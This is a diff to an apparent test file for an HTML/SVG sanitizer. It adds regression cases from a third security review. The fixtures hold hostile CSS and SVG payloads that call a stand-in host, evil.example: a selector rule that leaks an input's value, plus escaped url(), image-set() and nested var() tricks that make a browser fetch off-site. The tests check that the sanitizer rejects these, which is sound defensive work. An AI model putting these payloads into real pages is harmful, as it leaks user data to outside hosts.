@@ -100,7 +100,7 @@ record('style and svg are stripped', not has_real_tag(s, 'style') and not has_re
 record('sanitized stays, with the path', r.get('sanitized') is True and f'{HTML}/settings/html' in r.get('sanitized_paths', []), r)
 record('the report names the tags', e.get('removed_tags') == ['style', 'svg', 'g', 'path', 'rect', 'circle', 'line', 'polyline', 'polygon'], e)
 record('the report says the setting did it', e.get('inline_markup') == 'stripped_setting_off' and 'Allow inline SVG' in e.get('note', ''), e)
-record('the report warns about visible CSS text', 'visible text' in e.get('note', ''), e)
+record('no CSS is left as text, so there is no warning about it', 'visible text' not in e.get('note', '') and 'color' not in s.split('<')[0], e)
 r = write(GOOD, dry_run=True)
 record('a dry run reports the same', entry(r).get('inline_markup') == 'stripped_setting_off' and r.get('dry_run') is True, r)
 
@@ -196,6 +196,13 @@ OFF_SITE = {
     'selector exfiltration': '<input class="s9" name="secret" value="s"><style>input[name=secret][value^="s"]{--x:"url(";background:url(https://evil.example/leak?prefix=s)}</style>',
     'escaped url in svg paint': '<svg width="9" height="9"><rect width="9" height="9" fill="u\\72l(https://evil.example/I.svg#p)"/></svg>',
     'escaped url in svg stroke': '<svg width="9" height="9"><rect width="9" height="9" stroke="\\75rl(https://evil.example/J.svg#p)"/></svg>',
+    # Third review (1.16.0), each one requested from Chrome before the fix.
+    'escape before a multibyte character': '<style>.r2{--a:\\"ab€;background-image:image-set(\'https://evil.example/R2.png\' 1x);--b:\\"ab€}</style><div class="r2">x</div>',
+    'a number before url(': '<style>.r3{--w:1url(/*)"*/);background-image:image-set(\'https://evil.example/R3.png\' 1x);--q:"}</style><div class="r3">x</div>',
+    'a hash before url(': '<style>.r3b{--w:#url(/*)"*/);background-image:image-set(\'https://evil.example/R3b.png\' 1x);--q:"}</style><div class="r3b">x</div>',
+    'no slashes inside var': '<style>.r4{background-image:var(--n,image-set("http:evil.example/R4.png" 1x))}</style><div class="r4">x</div>',
+    'an https form inside var': '<style>.r4b{background-image:var(--n,image-set("https:evil.example/R4b.png" 1x))}</style><div class="r4b">x</div>',
+    'var inside var': '<style>.r5{background-image:var(--n,image-set(var(--u) 1x))}</style><div class="r5" style="--u:\'https://evil.example/R5.png\'">x</div>',
 }
 for name, payload in HOSTILE.items():
     r = write(payload)
@@ -214,6 +221,11 @@ for name, payload in OFF_SITE.items():
 VAR_CHAIN = '<div style="--x:url(https://evil.example/V1.svg#p)"><svg width="100" height="100"><rect width="100" height="100" fill="var(--x)"/></svg></div>'
 r = write(VAR_CHAIN)
 record('an off-site url() in a style attribute fails the value: no kept svg can reach it', entry(r).get('inline_markup') == 'stripped_unsafe' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)
+# These also fail the value (third review, 1.16.0). What the plain markup rule then does with a
+# style attribute is core's filter, the same with the setting off, so they stay out of the browser page.
+for label, value in (('a second url()', '<svg width="9" height="9"></svg><div style="background-image:url(/a.png),url(https://evil.example/R1.png)">x</div>'), ('image-set', '<svg width="9" height="9"></svg><div style="background-image:var(--n,image-set(\'https://evil.example/R6.png\' 1x))">x</div>'), ('a parenthesis in the host', '<svg width="9" height="9"></svg><div style="background-image:url(\'//localhost).evil.example/R7.png\')">x</div>')):
+    r = write(value)
+    record(f'{label} in a style attribute fails the value', entry(r).get('inline_markup') == 'stripped_unsafe' and not has_real_tag(stored(PAGE, HTML), 'svg'), r)
 r = write('<svg><rect fill="var(--brand)" stroke="currentColor"/></svg><div style="--brand:red">x</div>')
 record('...while a var() that names no other site stays', entry(r).get('inline_markup') == 'kept' and 'var(--brand)' in stored(PAGE, HTML), r)
 
